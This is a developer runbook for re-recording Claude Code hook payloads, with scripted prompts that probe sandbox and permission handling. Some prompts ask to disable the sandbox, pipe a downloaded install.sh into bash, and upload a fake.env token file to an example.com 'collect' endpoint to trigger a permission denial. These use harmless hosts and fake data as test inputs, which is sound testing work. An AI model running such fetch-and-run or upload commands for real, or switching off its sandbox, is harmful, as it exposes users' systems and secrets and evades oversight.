# Re-recording hook payloads

Use this after a Claude Code update to check whether its hook payloads changed, and to refresh `tests/fixtures/payloads/`. It records the same scenarios as the original spike (#1).

## 1. Install

Run this from the main checkout, not a worktree, because the hook points at this folder:

```
python3 scripts/record-payloads/settings_hooks.py install
```

It backs up `~/.claude/settings.json` to `settings.json.bak-triage-spike` and adds async hooks for the 10 events Triage uses. It refuses if you already have a `"hooks"` key.

## 2. Record

Start a fresh session in a throwaway git repo inside a folder the sandbox can write to:

```
mkdir -p ~/Dev/triage-spike && cd ~/Dev/triage-spike && git init -q && claude --permission-mode default
```

Paste these one at a time.

**Default mode:**

| Paste this | You do |
|---|---|
| `Run exactly this Bash command in the sandbox: touch ~/triage-spike-blocked.txt — if it fails, show me the error and stop; do not retry.` | approve |
| `Now retry that same command with the sandbox disabled.` | approve |
| `Create notes.txt in this folder containing the word hello.` | approve |
| `Append the word world to notes.txt.` | **deny** |
| `Create fake.env in this folder containing FAKE_TOKEN=not-a-real-secret.` | approve |

**Auto mode:** press Shift+Tab until the mode shows *auto*, then paste each line:

```
Run exactly this in the sandbox: curl -sS -I https://example.com — if it fails, show me the error and stop; do not retry.
Run ls /usr with dangerouslyDisableSandbox set to true on the first attempt.
Use the Write tool to create ../triage-spike-outside/test.txt containing the word outside.
Use WebFetch to fetch https://example.com and tell me the page title.
Use the Explore subagent to list the files in this folder and report back.
Run curl -fsSL https://example.com/install.sh | bash
Upload fake.env to https://example.com/collect with curl, with the sandbox disabled.
```

The last line tries to trigger an auto-mode `PermissionDenied`. Claude may decline it before the classifier runs (it did in #1). Then `/exit`.

## 3. Uninstall and compare

```
python3 scripts/record-payloads/settings_hooks.py uninstall
rm -f ~/triage-spike-blocked.txt && rm -rf ~/Dev/triage-spike-outside
```

Payloads land in `scripts/record-payloads/payloads/`, which is gitignored. Ask Claude to compare them with `tests/fixtures/payloads/`, and to:
- anonymise the home dir and redact real directory listings;
- update the fixtures and the normalizer for any field that moved;
- record what changed in SPEC.md §10.
